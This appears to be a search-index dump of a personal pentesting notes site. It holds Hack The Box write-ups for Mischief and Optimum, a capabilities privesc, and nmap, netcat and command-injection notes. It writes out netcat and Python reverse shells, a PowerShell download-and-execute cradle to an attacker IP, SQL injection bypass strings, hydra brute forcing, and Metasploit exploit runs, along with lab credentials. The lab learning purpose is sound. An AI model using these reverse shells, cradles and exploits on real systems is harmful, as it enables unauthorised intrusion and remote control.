/home/ldapuser1/tcpdump = cap_net_admin,cap_net_raw+ep │ /home/ldapuser1/openssl =ep e : effective active p : permitted effective / users allowed i : inherited /home/ldapuser1/tcpdump -i ens33 -G1 -w /dev/null -z ./b.sh setcap cap_setuid=ep b.sh unable to set CAP_SETFCAP effective capability: Operation not permitted strings openssl | grep cap unable to load Netscape SPKAC structure Netscape SPKAC structure not found in %s -hack - workaround for early Netscape code %s is not multi-block capable escape character at end of string Netscape certificate sequence utility -nsdb use (nonstandard) DSA Netscape DB format -nosmimecap -c - for each engine, also list the capabilities strings openssl | grep OPENSSL  onces you change the file it removes the capabilities and added benefit to using them. So i whave to wrok inside th confines of openssl.\nhttps://gtfobins.github.io/gtfobins/openssl/\nsince /openssl has pe it will run as root allowing us to read any file on the system.\nopenssl enc -in \u0026ldquo;filename\u0026rdquo;\n"
},
{
	"uri": "/linux/linux/",
	"title": "Linux",
	"tags": [],
	"description": "",
	"content": "Permisions ~~~~\n​ Chown change owner, the below example will change all the files in the directory to owner Pwny_sec and tot he group root.\nchown -R Pwny_sec:root * -R recurssive  ​ Chmod change modification, this can be used to change how a file is treated can you read or write or execute the file plus suid how the file inherits it\u0026rsquo;s permissions. like from the user who created it suid.\nread write permissions chmod 645 file.txt To Execute or remove execute functionality. chmod +x file.sh chmod -x file.sh  "
},
{
	"uri": "/linux/",
	"title": "Linuxes",
	"tags": [],
	"description": "",
	"content": ""
},
{
	"uri": "/hackthebox/challenges/",
	"title": "Miscellaneous",
	"tags": [],
	"description": "",
	"content": "Setting up Test Enviroment or Complicated tools.\n  \n  "
},
{
	"uri": "/hackthebox/boxes/mischief/",
	"title": "Mischief",
	"tags": [],
	"description": "",
	"content": " THIS IS A SUMMARY OF IPPSEC VIDEO \u0026amp; 0XDF GUIDE.\nwatch the ippsec video https://www.youtube.com/watch?v=GKo6xoB1g4Q\nread this guide https://0xdf.gitlab.io/2019/01/05/htb-mischief.html\nSummary, this box highlights securing ipv6. I would like to note the ipv6 address changes every reset so careful copy pasting.\nThe quality of the phpsession tokens is exellent damnit.\nNmap -v print output as it find it\n-max-retries 0 \u0026lt;\u0026ndash; save for later\n# Nmap 7.70 scan initiated Tue Jan 1 16:00:09 2019 as: nmap -sV -sC -p- -Pn -oA total -T5 10.10.10.92 Nmap scan report for 10.10.10.92 Host is up (0.14s latency). Not shown: 65533 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 (RSA) | 256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f (ECDSA) |_ 256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 (ED25519) 3366/tcp open caldav Radicale calendar and contacts server (Python BaseHTTPServer) | http-auth: | HTTP/1.0 401 Unauthorized\\x0D |_ Basic realm=Test |_http-server-header: SimpleHTTP/0.6 Python/2.7.15rc1 |_http-title: Site doesn't have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  TCP - connect 22/tcp open ssh 80/tcp open http 1857/tcp filtered datacaptor 2308/tcp filtered sdhelp 3465/tcp filtered edm-mgr-cntrl 3541/tcp filtered voispeed-port  UDP Not shown: 994 closed ports PORT STATE SERVICE VERSION 3/udp open|filtered tcpwrapped 80/udp open|filtered tcpwrapped 17219/udp open|filtered chipper 19193/udp open|filtered unknown 31625/udp open|filtered unknown 52225/udp open|filtered unknown  https://security.stackexchange.com/questions/23407/how-to-bypass-tcpwrapped-with-nmap-scan\n\u0026ldquo;tcpwrapped\u0026rdquo; refers to tcpwrapper, a host-based network access control program on Unix and Linux. When Nmap labels something tcpwrapped, it means that the behavior of the port is consistent with one that is protected by tcpwrapper. Specifically, it means that a full TCP handshake was completed, but the remote host closed the connection without receiving any data.\nSNMPWALK First to make it easier, install snmp-mibs-downloader a psuedo api. Instead of supplying the string of numbers supply something easier to to understand.\nhttps://0xdf.gitlab.io/2019/01/05/htb-mischief.html#tool-setup\nMessed up here to blindsided did n\u0026rsquo;t fully enumerate snmp. Theres a huge oid list interesting ones will let you read system processes\nOID REFERENCE\nsnmpwalk -v 2c -c public 10.10.10.92 ipAddressTable\nsnmpwalk -v 2c -c public 10.10.10.92 1.3.6.1.2.1.4.34.1.3.2\nsnmpwalk -v 2c -c public 10.10.10.92 hrSWRunTable\nsnmpwalk -v 2c -c public 10.10.10.92 1.3.6.1.2.1.25.4.2\nsnmpwalk -v 2c -c public 10.10.10.92 hrSWRunTable | grep loki\nHOST-RESOURCES-MIB::hrSWRunParameters.601 = STRING: \u0026ldquo;-c /home/loki/hosted/webstart.sh\u0026rdquo; HOST-RESOURCES-MIB::hrSWRunParameters.609 = STRING: \u0026ldquo;/home/loki/hosted/webstart.sh\u0026rdquo; HOST-RESOURCES-MIB::hrSWRunParameters.619 = STRING: \u0026ldquo;-m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki \u0026ndash;dir /home/loki/hosted/\u0026rdquo;\nsnmpwalk -c public -v2c 10.10.10.92 | tee snmpwalk-mib.out\ntee prints the output as it goes\nCREDS\nUser: loki Pass: godofmischiefisloki\nIPV6 ADDRESS\niso.3.6.1.2.1.4.34.1.3.2.16.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.1 = INTEGER: 1 iso.3.6.1.2.1.4.34.1.3.2.16.222.173.190.239.0.0.0.0.2.80.86.255.254.143.244.163 = INTEGER: 2 iso.3.6.1.2.1.4.34.1.3.2.16.254.128.0.0.0.0.0.0.2.80.86.255.254.143.244.163 = INTEGER: 2\nssh into another box on the htb you can do the link local address ipv6 has a link local and routerable addr if your on the same layer 2 link you can access it.\nENYX but a python enyx.py 2c public 10.10.10.92\n[+] Snmpwalk found. [+] Grabbing IPv6. [+] Loopback -\u0026gt; 0000:0000:0000:0000:0000:0000:0000:0001 [+] Unique-Local -\u0026gt; dead:beef:0000:0000:0250:56ff:fe8f:f4a3 [+] Link Local -\u0026gt; fe80:0000:0000:0000:0250:56ff:fe8f:f4a3\nBruteForcing Community Strings\nupdate onesixtyone\nonesixtyone -c /seclist/common-snmp addr ./onesixtyone -c /opt/htb/wordlist/seclist /Discovery/SNMP/common-snmp-community-strings.txt 10.10.10.92 Scanning 1 hosts, 122 communities 10.10.10.92 [public] Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64 10.10.10.92 [public] Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64  Second set of credentials user: loki | Pass: trickeryanddeceit\nroot@kali:~/hackthebox/mischief-10.10.10.92# curl -s -6 -X POST \u0026quot;http://[dead:beef::250:56ff:feb2:7cff]:80/\u0026quot; -H \u0026quot;Cookie: PHPSESSID=697rbtjrbikamspvck4p3u309d\u0026quot; -d \u0026quot;command=nc\u0026quot;  GOBUSTER /login.php (Status: 200) /assets (Status: 301) /index.php (Status: 200) /database.php (Status: 200) /logout.php (Status: 302\nwfuzz -hl 28 -c -b \u0026ldquo;PHPSESSID=je830qer33ef3jvs3h140o2n8t\u0026rdquo; -w /opt/htb/wordlist/seclist/Discovery/Web-Content/burp-parameter-names.txt -u \u0026ldquo;http://loki.htb/login.php?FUZZ=whoami\u0026quot;\nwfuzz -c -b \u0026ldquo;PHPSESSID=je830qer33ef3jvs3h140o2n8t\u0026rdquo; -w /opt/htb/wordlist/seclist/Fuzzing/Command-Injection-commix.txt -u \u0026ldquo;http://loki.htb/login.php?login=FUZZ\u0026quot;\nwfuzz \u0026ndash;hw 32 -c -b \u0026ldquo;PHPSESSID=je830qer33ef3jvs3h140o2n8t\u0026rdquo; -w /opt/htb/wordlist/seclist/Fuzzing/LFI-JHADDIX.txt -u \u0026ldquo;http://loki.htb/assets/FUZZ\u0026quot;\nSQL perhaps submit query when submiting the creds at the login page are vulnerable to sql injection\nhttp://www.securityidiots.com/Web-Pentest/SQL-Injection/bypass-login-using-sql-injection.html\n'or\u0026quot;=' ') or true-- ') or ('')=(' ') or 1-- ') or ('x')=('  The big mistake I made with wfuzz was not fuzzing POST request and only using GET request. I also missed allot of the snmpwalk hints.\nBAD wfuzz -hl 28 -c -b \u0026quot;PHPSESSID=je830qer33ef3jvs3h140o2n8t\u0026quot; -w /opt/htb/wordlist/seclist/Discovery/Web-Content/burp-parameter-names.txt -u \u0026quot;http://loki.htb/login.php?FUZZ=whoami\u0026quot;  GOOD wfuzz -c -w /opt/htb/wordlist/seclist/Discovery/Web-Content/burp-parameter-names.txt -d \u0026quot;FUZZ=junk\u0026quot; --hh 403 'http://loki.htb/'  OUTPUT 000207: C=200 20 L 35 W 436 Ch \u0026quot;command\u0026quot; 000546: C=200 20 L 31 W 403 Ch \u0026quot;left\u0026quot;  The supplied creds from the last webpage wont work in any combination. Using hydra to enumerate possible users, will return administrator. The password file should include both of the password from the previous steps (godofmischiefisloki, trickeryanddeceit), using Seclists top-usersnames-shortlist for the user enumeration.\nHYDRA hydra loki.htb -L /opt/htb/wordlist/seclist/Usernames/top-usernames-shortlist.txt -P passwords http-form-post \u0026quot;/login.php:user=^USER^\u0026amp;password=^PASS^:Sorry, those credentials do not match\u0026quot; user: administrator pass: trickeryanddeceit -L word list -P password - http-form-port the type of request after ^PASS^ notice : those are the parameter it will look for when it fails.  WebDev\nIt pipes user input into /dev/nul but it can only handle one command using two commands it will pipe the last to /dev/null and will execute the first line. credentials didn\u0026rsquo;t work because ls was strictly compared so any iterance of ls will be blacklisted\nippsec used rm netcat reverse shelll and to bypass the waf he used a question mark.\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.0.0.1 1234 \u0026gt;/tmp/f rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|n? 10.0.0.1 1234 \u0026gt;/tmp/f it wont allow ipv4 so have to also use -6 switch and use ipv6 addr rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|n? -6 dead:beef:2::100c 9056 \u0026gt;/tmp/f  So this is from 0xdf guide, save this for a later ctf.\n#/bin/bash #// variable command_file=$1 #// for each command in file do curl cmd for cmd in $(cat ${command_file}); do curl -s -6 -X POST \u0026quot;http://[dead:beef::250:56ff:feb2:7cff]:80/\u0026quot; -H \u0026quot;Cookie: PHPSESSID=697rbtjrbikamspvck4p3u309d\u0026quot; -d \u0026quot;command=${cmd}\u0026quot; | grep -q \u0026quot;Command is not allowed.\u0026quot; #// if the previous command returns one if true. #// (grep) -e regex -q quiet...suppress all normal output #// $? is the exit code from the previous command. so in this case,grep #// grep returns 1 if it doesn't find the string you're looking for if [ $? -eq 1 ]; then #// echo -e \\e enable parsing of the escape sequences [49m deals with #// the Default background color echo -e \u0026quot;\\e[42m${cmd}\\e[49m allowed\u0026quot;; else echo -e \u0026quot;\\e[41m${cmd}\\e[49m blocked\u0026quot;; fi; done  This script sets two variables ip and cmd will ask for input allow us to test for different commands\ndead:beef::250:56ff:fe8f:f4a3\n#!/bin/bash ip=$1 cmd=$2 curl -s -6 -X POST \u0026quot;http://[${ip}]:80/\u0026quot; -d \u0026quot;command=${cmd};\u0026quot; | grep -F \u0026quot;\u0026lt;/html\u0026gt;\u0026quot; -A 10 | grep -vF -e \u0026quot;\u0026lt;/html\u0026gt;\u0026quot; -e \u0026quot;Command was executed succesfully!\u0026quot;  things to note escapes were added after quotes socket was change from ipv4 to 6 socket,AF_INET6\n./cmd.sh ipv6_addr_changeme \u0026ldquo;python -c \u0026lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\\\u0026ldquo;YOUR_IPV6_ADDR_CHANGEME\\\u0026ldquo;,443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\u0026ldquo;/bin/sh\\\u0026ldquo;,\\\u0026ldquo;-i\\\u0026ldquo;]);\u0026lsquo;\u0026rdquo;\nNetCat\nip addr |grep inet6 #// use the scope global address\nnc -nv \u0026ndash;listen Your_ipv6_addr 443\nLimited access with a www-data users. get the file called creds and assh into the box\nlokiisthebestnorsegod\nssh loki@10.10.10.92\nROOT\nSome files to check next time su isn\u0026rsquo;t available. /etc/pam.d/su handles authentication for su, next file access control lists (facl) getfacl.\nthree options for root first since loki can\u0026rsquo;t su but www-data can su. second use systemd-run to get a reverse shell as root using ipv6. just repeat the part up top enter su into the terminal and enter the password.\nhttps://0xdf.gitlab.io/2019/01/05/htb-mischief.html#option-1---use-www-data-shell\n"
},
{
	"uri": "/linux/netcat/",
	"title": "NetCat PORT SCAN",
	"tags": [],
	"description": "",
	"content": "NetCat as a port scanner with a little bash foo. We can make bash script that will enumerate ports on a target. NetCat is common on Linux systems. So chances are high it will be available. UPDATE : I hate the out put from this script. it was originally a ip range scanner.\nfor ip in $(seq 1 254); do nc -zv -w 1 172.16.24.$ip 22 2\u0026gt;\u0026amp;1 \u0026gt; /tmp/nul | grep -v 'timed' \u0026amp; done   for ip in $(seq 1 1000); do nc -zv -w 1 10.0.0.2 $ip 2\u0026gt;\u0026amp;1 \u0026gt; /tmp/nul | grep -v 'timed' \u0026amp; done   nc -zv -w 1 172.17.0.2 8900-10000 2\u0026gt;\u0026amp;1 | grep succeeded!   "
},
{
	"uri": "/hackthebox/boxes/help/",
	"title": "Network Manager Down",
	"tags": [],
	"description": "Network Icon Disappeared",
	"content": "The weirdest glitch bug I\u0026rsquo;ve ever experienced I am not sure I how I deleted the icon but it disappeared I could no longer access the network manager. Well fix the problem and see how to get to the internet without the network manager.\nI\u0026rsquo;m not sure if completely removing the network manager is required but i purged it out.\n sudo apt-get purge network-manager  To gain internet access reset the dhclient on the network interface, your network card maybe not be named eth0.\nsudo dhclient eth0  Test your connection ping google.com\nping google.com  Install network manager\nsudo apt-get update \u0026amp;\u0026amp; sudo apt-get upgrade \u0026amp;\u0026amp; sudo apt-get install network-manager -y  "
},
{
	"uri": "/hackthebox/boxes/help/",
	"title": "Network Manager Down",
	"tags": [],
	"description": "Network Icon Disappeared",
	"content": "The weirdest glitch bug I\u0026rsquo;ve ever experienced I am not sure I how I deleted the icon but it disappeared I could no longer access the network manager. Well fix the problem and see how to get to the internet without the network manager.\nI\u0026rsquo;m not sure if completely removing the network manager is required but i purged it out.\n sudo apt-get purge network-manager  To gain internet access reset the dhclient on the network interface, your network card maybe not be named eth0.\nsudo dhclient eth0  Test your connection ping google.com\nping google.com  Install network manager\nsudo apt-get update \u0026amp;\u0026amp; sudo apt-get upgrade \u0026amp;\u0026amp; sudo apt-get install network-manager -y  "
},
{
	"uri": "/network-manager-down/",
	"title": "Network Manager Down",
	"tags": [],
	"description": "Network Icon Disappeared",
	"content": "The weirdest glitch bug I\u0026rsquo;ve ever experienced I am not sure I how I deleted the icon but it disappeared I could no longer access the network manager. Well fix the problem and see how to get to the internet without the network manager.\nI\u0026rsquo;m not sure if completely removing the network manager is required but i purged it out.\n sudo apt-get purge network-manager  To gain internet access even though the network manager is down and isn\u0026rsquo;t connected. Doesn\u0026rsquo;t mean your screwed. Rest the dhclient on the network interface, your network card maybe not be named eth0.\nsudo dhclient eth0  Test your connection ping google.com\nping google.com  Install network manager\nsudo apt-get update \u0026amp;\u0026amp; sudo apt-get upgrade \u0026amp;\u0026amp; sudo apt-get install network-manager -y  "
},
{
	"uri": "/linux/nmap/",
	"title": "Nmap",
	"tags": [],
	"description": "",
	"content": "Nmap is a port scanning tool that can enumerate devices operating systems and even run scripts that intrusive. Allot of tools have a wide range of abilities but specialize at one thing. Nmap uses ping sweeps and a lot of math to figure everything out. For example based ping time to live, you can figure out the operating system based on how lit takes to handle the information ~128 windows ~64 Linux.\nnmap -sC -sV -Pn -p- -oA total-nightmare -T3 10.10.10.6\nnmap -sT -vv -oA total-nightmare -T3 10.10.10.6 TCP CONNECT nmap -sU -p- -oA total-UDP-nightmare -T3 10.10.10.6 UDP SCAN -sC: equivalent to \u0026ndash;script=default\n-sV: Probe open ports to determine service/version info\n-Pn: Treat all hosts as online \u0026ndash; skip host discovery ​ nmap -v -iR 10000 -Pn -p 80\n-p port ranges : Only scan specified ports ​ Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9 \u0026ndash;exclude-ports port ranges : Exclude the specified ports from scanning\n-p- Scan 1 to 65000 ports\n-T1 1 through 5 it\u0026rsquo;s not recommended to run 5\nNmap : nmap using typicalling only does half of the three way handshake the syn syn-ack. To enable nmap to use the full syn, syn-ack, ack -sT switch will tell nmap to do the full connection.\nExample Nmap 7.70 scan initiated Sun Dec 2 14:12:17 2018 as: nmap -sC -sV -Pn -p- -oA total-nightmare -T5 10.10.10.6` `Nmap scan report for 10.10.10.66` `Host is up (0.14s latency).` `Not shown: 65533 filtered ports` \u0026lt;div class=\u0026quot;notices note\u0026quot; \u0026gt;\u0026lt;p\u0026gt;\u0026lt;code\u0026gt;PORT STATE SERVICE VERSION\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;80/tcp open http Apache httpd 2.4.18 ((Ubuntu))\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;| http-cookie-flags:\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;| /:\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;| PHPSESSID:\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;|_ httponly flag not set\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;|_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: NOTES\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;2222/tcp open ssh (protocol 2.0)\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;| fingerprint-strings:\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;| NULL:\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;|_ SSH-2.0-OpenSSH 32bit (not so recent ver)\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;| ssh-hostkey:\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;| 1024 e2:71:84:5d:ed:07:89:98:68:8b:6e:78:da:84:4c:b5 (DSA)\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;| 2048 bd:1c:11:9a:5b:15:d2:f6:28:76:c3:40:7c:80:6d:ec (RSA)\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;| 256 bf:e8:25:bf:ca:92:55:bc:ca:a4:96:c7:43:d0:51:73 (ECDSA)\u0026lt;/code\u0026gt; \u0026lt;code\u0026gt;|_ 256 6f:14:30:b1:39:47:54:b7:5a:01:be:96:2c:a7:96:58 (ED25519)\u0026lt;/code\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; `1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :` `SF-Port2222-TCP:V=7.70%I=7%D=12/2%Time=5C042F3B%P=x86_64-pc-linux-gnu%r(NU` `SF:LL,2B,\u0026quot;SSH-2\\.0-OpenSSH\\x2032bit\\x20\\(not\\x20so\\x20recent\\x20ver\\)\\r\\n\u0026quot;` `SF:);` `Service detection performed. Please report any incorrect results at https://nmap.org/submit/`   "
},
{
	"uri": "/concepts/webapppentest/osinjcmd/",
	"title": "OS Command Injection",
	"tags": [],
	"description": "",
	"content": "No, probably not what your thinking. I’m talking about web app pen-testing. A lot of programming languages are vulnerable, to command injection via webpage. The user supplies OS commands that are escaped and executed. This is due to not properly sanitizing user input or elements aren’t hard coded allowing for exploitation. Below are the characters to sanitize.\n| \u0026amp;\u0026amp; … ; `(tilda) \u0026gt; \u0026lt; \\ !  This vulnerability can occur by using as owsp puts it Dangerous API, or using system commands inside a script that handles users supplied input.\nPHP system exec eval shell_exec ASP.NET HttpRequest.Params HttpRequest.Url HttpRequest.Item EXAMPLES hackthebox.eu/index.php?exec=ls index.php?shell_exec=c3ViMmlw;ls index.php?shell_exec=c3ViMmlw||ls POST request tester=c3ViMmlw|ls tester=c3ViMmlw||ls tester=c3ViMmlw;ls tester2=c3ViMmlw\u0026amp;\u0026amp;ls \u0026lt; -- in some scenario you'll need to encode theses values  Common system commands functions\ncmd=junk command=junk exec=junk  FOR MORE INFORMATION PLEASE FOLLOW THESES LINKS\nhttps://null-byte.wonderhowto.com/how-to/use-command-injection-pop-reverse-shell-web-server-0185760/\nTesting for Command Injection (OTG-INPVAL-013) - OWASP *OS command injection is a technique used via a web interface in order to execute OS commands on a web server. The user…*www.owasp.org\nhttps://www.owasp.org/index.php/Command_Injection\n"
},
{
	"uri": "/hackthebox/boxes/optimum/",
	"title": "Optimum",
	"tags": [],
	"description": "",
	"content": "NMAP\nnmap -sV -sC 10.10.10.8 Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-25 00:19 EST Nmap scan report for 10.10.10.8 Host is up (0.042s latency). Not shown: 999 filtered ports PORT STATE SERVICE VERSION 80/tcp open http HttpFileServer httpd 2.3 |_http-server-header: HFS 2.3 |_http-title: HFS / Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.89 seconds  hfs is vulnerable to a cmd injection vuln. That will allow us to Invoke a nishang shell\nSEARCHSPLOIT\nsearchsploit hfs --------------------------------------------------------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (/usr/share/exploitdb/) --------------------------------------------------------------------------------------------------------------------- ---------------------------------------- Apple Mac OSX 10.4.8 - DMG HFS+ DO_HFS_TRUNCATE Denial of Service | exploits/osx/dos/29454.txt Apple Mac OSX 10.6 - HFS FileSystem (Denial of Service) | exploits/osx/dos/12375.c Apple Mac OSX 10.6.x - HFS Subsystem Information Disclosure | exploits/osx/local/35488.c Apple Mac OSX xnu 1228.x - 'hfs-fcntl' Kernel Privilege Escalation | exploits/osx/local/8266.txt FHFS - FTP/HTTP File Server 2.1.2 Remote Command Execution | exploits/windows/remote/37985.py Linux Kernel 2.6.x - SquashFS Double-Free Denial of Service | exploits/linux/dos/28895.txt Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit) | exploits/windows/remote/34926.rb Rejetto HTTP File Server (HFS) 1.5/2.x - Multiple Vulnerabilities | exploits/windows/remote/31056.py Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbitrary File Upload | exploits/multiple/remote/30850.txt Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1) | exploits/windows/remote/34668.txt Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2) | exploits/windows/remote/39161.py Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c - Remote Command Execution | exploits/windows/webapps/34852.txt --------------------------------------------------------------------------------------------------------------------- ----------------------------------------  So First i got a nishang shell then i moved over to a nc.exe shell using this really cool trick 0xdf used in his devel writeup. https://0xdf.gitlab.io/2019/03/05/htb-devel.html#shell-as-web . after that im going to run Watson and find an exploit.\nsysteminfo  its running on x64-baseed pc using\nreg query \u0026quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\u0026quot;  HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\CDF HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4.0  cd C:\\Users\u0026gt;c:\\Windows\\Microsoft.NET\\Framework dir /A:D  i will compile it in 4.0 .net. 0xdf has a great guide for compiling watson \u0026amp; ippsec has a video on it.\nhttps://0xdf.gitlab.io/2019/03/05/htb-devel.html#Watson\n\\\\10.10.14.49\\share\\Watson-net4-64base.exe __ __ _ / / /\\ \\ \\__ _| |_ ___ ___ _ __ \\ \\/ \\/ / _` | __/ __|/ _ \\| '_ \\ \\ /\\ / (_| | |_\\__ \\ (_) | | | | \\/ \\/ \\__,_|\\__|___/\\___/|_| |_| v0.1 Sherlock sucks... @_RastaMouse [*] OS Build number: 9600 [*] CPU Address Width: 64 [*] Process IntPtr Size: 8 [*] Using Windows path: C:\\WINDOWS\\System32 [*] Appears vulnerable to MS15-051 [\u0026gt;] Description: An EoP exists due to improper object handling in the win32k.sys kernel mode driver. [\u0026gt;] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms15_051_client_copy_image.rb [\u0026gt;] Notes: None. [*] Appears vulnerable to MS15-076 [\u0026gt;] Description: Local DCOM DCE/RPC connections can be reflected back to a listening TCP socket allowing access to an NTLM authentication challenge for LocalSystem, which can be replayed to the local DCOM activation service to elevate privileges. [\u0026gt;] Exploit: https://www.exploit-db.com/exploits/37768/ [\u0026gt;] Notes: None. [*] Appears vulnerable to MS15-078 [\u0026gt;] Description: An EoP exists due to a pool based buffer overflow in the atmfd.dll driver when parsing a malformed font. [\u0026gt;] Exploit: https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms15_078_atmfd_bof.rb [\u0026gt;] Notes: None. [*] Appears vulnerable to MS16-032 [\u0026gt;] Description: An EoP exists due to a lack of sanitization of standard handles in Windows' Secondary Logon Service. [\u0026gt;] Exploit: https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1 [\u0026gt;] Notes: None. [*] Appears vulnerable to MS16-034 [\u0026gt;] Description: An EoP exist when the Windows kernel-mode driver fails to properly handle objects in memory. [\u0026gt;] Exploit: https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-034 [\u0026gt;] Notes: None. [*] Finished. Found 5 vulns :) ERROR\u0026gt; C:\\WINDOWS\\System32\\drivers\\mrxdav.sys ERROR\u0026gt; C:\\WINDOWS\\System32\\win32kfull.sys ERROR\u0026gt; C:\\WINDOWS\\System32\\pcadm.dll ERROR\u0026gt; C:\\WINDOWS\\System32\\coremessaging.dll  I could never get this to work i tried a bunch of different ways. ippsec said that the other ms16032 exploit out there requires additional modification to work. but the empire framework offers an easier solution. \\10.10.14.49\\share\\Invoke-MS16032.ps1\nadd this at the end of ms16032\nInvoke-MS16032 -Command \u0026quot;iex(New-Object Net.Webclient).downloadstring('http://10.10.14.49/sploit.ps1')\u0026quot;  then invoke it, after you load the payload you can call the funtions with Invoke-MS16032\nMETASPLOIT\ni couldn\u0026rsquo;t get it to work so on to metasploit.\nsearch rejetto use windows/http/rejetto_hfs_exec  Make sure burp is running.\noptions Module options (exploit/windows/http/rejetto_hfs_exec): Name Current Setting Required Description ---- --------------- -------- ----------- HTTPDELAY 10 no Seconds to wait before terminating web server Proxies http:127.0.0.1:8080 no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.8 yes The target address range or CIDR identifier RPORT 80 yes The target port (TCP) SRVHOST 10.10.14.49 yes The local host to listen on. This must be an address on the local machine or 0.0.0.0 SRVPORT 8088 yes The local port to listen on. SSL false no Negotiate SSL/TLS for outgoing connections SSLCert no Path to a custom SSL certificate (default is randomly generated) TARGETURI / yes The path of the web application URIPATH no The URI to use for this exploit (default is random) VHOST no HTTP server virtual host Payload options (windows/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 10.10.14.49 yes The listen address (an interface may be specified) LPORT 4446 yes The listen port Exploit target: Id Name -- ---- 0 Automatic  NEXT\nFirst you need to load the regular meterpreter x86 to find the vuln then move to x64 to run the exploit. set lport to something else. set target 1 will run in x64 mode.\nset payload windows/x64/meterpreter/reverse_tcp set LPORT 9017  RUN\nexit the session with crtl + z save session remember the session number.\nsearch ms16_032 windows/local/ms16_032_secondary_logon_handle_privesc  options\ntarget 1 to change to x64, session number, set the lport to something different than the meterpreter shell.\nset target 1 set lport 9019 set session 2 run  Module options (exploit/windows/local/ms16_032_secondary_logon_handle_privesc): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION 3 yes The session to run this module on. Payload options (windows/x64/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none) LHOST 10.10.14.49 yes The listen address (an interface may be specified) LPORT 4446 yes The listen port Exploit target: Id Name -- ---- 1 Windows x64  Then it hangs.\nALPX task scheduler local privilege elevation\nwrites arbitrary dacls to ,job files located in c:windows\\task. This is pretty bad lol it doesn\u0026rsquo;t check for an impersonation attack. since we can create files in c:\\windows\\task folder a hardlink can be created to a file the user has read access to. after creating a hardlink, the vulnerability can triggered to set the dacls ton the linked file. teste dup windows10\nmsf5 post(multi/recon/local_exploit_suggester) \u0026gt; use exploit/windows/local/alpc_taskscheduler msf5 exploit(windows/local/alpc_taskscheduler) \u0026gt; options Module options (exploit/windows/local/alpc_taskscheduler): Name Current Setting Required Description ---- --------------- -------- ----------- PROCESS no Name of process to spawn and inject dll into. SESSION yes The session to run this module on. Exploit target: Id Name -- ---- 0 Windows 10 x64  need to set the lhost, lport, \u0026amp; session.\ncrtl + z ps migrate elevatured process. set session 2 set payload windows/x64/meterpreter/reverse_tcp set lhost ippaddr set lport 443 run  "
},
{
	"uri": "/concepts/webapppentest/phptypejuggling/",
	"title": "PHP Typw Juggling",
	"tags": [],
	"description": "",
